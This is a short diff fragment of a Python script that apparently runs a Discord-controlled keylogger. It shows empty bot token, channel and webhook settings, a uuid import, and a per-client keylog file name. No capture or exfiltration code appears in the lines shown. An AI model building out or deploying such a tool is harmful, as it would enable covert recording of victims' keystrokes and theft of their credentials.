@@ -27,8 +27,9 @@ import discord as dc
 from discord.ext import commands, tasks
 
 BOT_TOKEN = ""
-CHANNEL_ID =  
+CHANNEL_ID = 
 WEBHOOK_URL = "" 
+import uuid as u
 CLIENT_ID = str(u.uuid4())[:8]
 KEYLOG_FILE = f"{CLIENT_ID}_keylog.txt"
 
